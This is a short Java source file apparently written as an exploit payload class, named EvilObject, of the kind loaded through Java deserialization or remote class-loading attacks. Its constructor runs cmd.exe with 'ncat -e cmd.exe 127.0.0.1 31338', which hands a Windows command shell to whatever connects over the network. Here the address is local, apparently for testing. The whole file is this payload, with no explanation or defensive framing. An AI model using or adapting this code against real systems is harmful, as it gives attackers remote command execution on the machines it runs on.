import java.lang.Runtime;
import java.lang.Process;

public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"cmd.exe", "/c", "ncat -e cmd.exe 127.0.0.1 31338"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}